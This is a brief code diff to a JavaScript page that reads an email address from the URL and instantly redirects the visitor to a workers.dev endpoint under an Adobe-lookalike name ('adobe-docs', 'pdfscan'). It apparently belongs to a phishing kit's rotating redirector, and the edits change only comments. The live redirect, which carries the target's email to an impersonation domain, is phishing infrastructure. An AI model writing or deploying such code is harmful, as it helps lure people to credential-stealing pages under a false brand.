@@ -10,13 +10,12 @@
       return params.get("email") || "";
     }
 
-    // Redirect to your KV rotation Worker
     function redirectToWorker() {
       const email = getEmail();
-      let url = "https://pdfscan-3030-fastdoc.adobe-docs.workers.dev/";
+      let url = "https://pdfscan-3030-fastdoc.adobe-docs.workers.dev/"; // main worker endpoint
       if (email) url += "?email=" + encodeURIComponent(email);
 
-      // Immediate redirect
+      // Forward immediately to Worker
       window.location.replace(url);
     }
 
